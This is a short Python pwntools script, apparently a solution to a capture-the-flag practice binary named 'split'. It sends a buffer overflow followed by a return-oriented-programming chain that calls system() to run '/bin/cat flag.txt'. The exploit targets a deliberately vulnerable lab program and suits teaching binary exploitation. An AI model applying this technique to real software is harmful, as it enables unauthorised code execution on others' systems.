#!/usr/bin/env python

from pwn import *

p = process("./split")
p.recv(1024)

payload = (
    "\x90" * 40 +
    p64(0x400883) + # pop rdi ; ret
    p64(0x601060) + # "/bin/cat flag.txt"
    p64(0x4005e0)   # <system@plt>
)

p.sendline(payload)
print(p.recvall())
p.close()
